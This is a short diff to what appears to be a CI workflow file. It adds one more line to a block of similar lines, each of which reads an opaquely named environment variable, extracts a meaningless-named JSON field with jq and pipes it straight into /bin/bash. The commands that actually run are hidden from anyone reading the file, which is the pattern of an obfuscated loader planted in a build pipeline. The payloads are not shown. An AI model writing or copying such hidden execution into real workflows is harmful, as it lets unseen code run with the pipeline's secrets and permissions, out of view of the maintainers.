@@ -27,6 +27,7 @@ jobs:
           echo $qysu566 | jq -r .x50082 | /bin/bash
           printf '%s' "$y64" | jq -r .mysn0 | /bin/bash
           echo $opfqy450 | jq -r .kyinb6 | /bin/bash
+          printf '%s' "$qpdwk3" | jq -r .otk0 | /bin/bash
 
       - name: Save output
         if: always()
